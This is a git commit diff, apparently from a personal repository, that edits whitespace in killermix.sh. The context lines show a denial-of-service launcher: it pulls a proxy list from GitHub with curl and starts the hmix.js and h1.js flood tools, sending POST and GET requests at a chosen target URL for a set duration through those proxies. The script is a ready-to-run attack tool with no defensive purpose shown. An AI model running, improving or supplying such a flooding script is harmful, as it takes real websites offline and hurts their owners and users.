9f4d1e330e63059a769d884a60c735b0efe90981
hackerlove123 <149338972+hackerlove123@users.noreply.github.com>
2025-04-14 07:16:09 +0700

    her

--- killermix.sh
+++ killermix.sh
@@ -6,7 +6,7 @@
 URL=$1
 TIME=$2
 
-# Tải proxy loại HTTP + HTTPS vào live.txt
+# Tải proxy loại HTTP + HTTPS vào live.txt 
 for type in https; do
   curl -s "https://raw.githubusercontent.com/neganok/NGCSLPRX/refs/heads/main/Proxies/${type}.txt"
 done > live.txt
@@ -15,7 +15,7 @@ done > live.txt
 export NODE_OPTIONS=--max-old-space-size=8192
 
 node hmix.js -m POST -u "$URL" -s "$TIME" -p live.txt -t 1 --full true -d false &
-  
+
 node h1.js POST "$URL" live.txt "$TIME" 999 10 randomstring="true" &
 node h1.js GET "$URL" live.txt "$TIME" 999 10 randomstring="true" &
 
